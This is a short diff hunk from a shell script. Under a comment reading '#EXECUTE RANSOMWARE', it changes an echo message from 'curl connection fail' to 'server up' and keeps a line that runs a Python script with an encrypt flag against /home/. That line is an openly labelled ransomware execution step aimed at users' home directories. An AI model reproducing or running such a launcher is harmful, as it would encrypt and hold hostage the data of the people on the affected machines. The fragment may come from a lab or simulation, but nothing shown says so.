@@ -31,7 +31,7 @@ do
 done
 
 #EXECUTE RANSOMWARE
-echo "curl connection fail"
+echo "server up"
 python upcrans.py --encrypt --path /home/
 
 
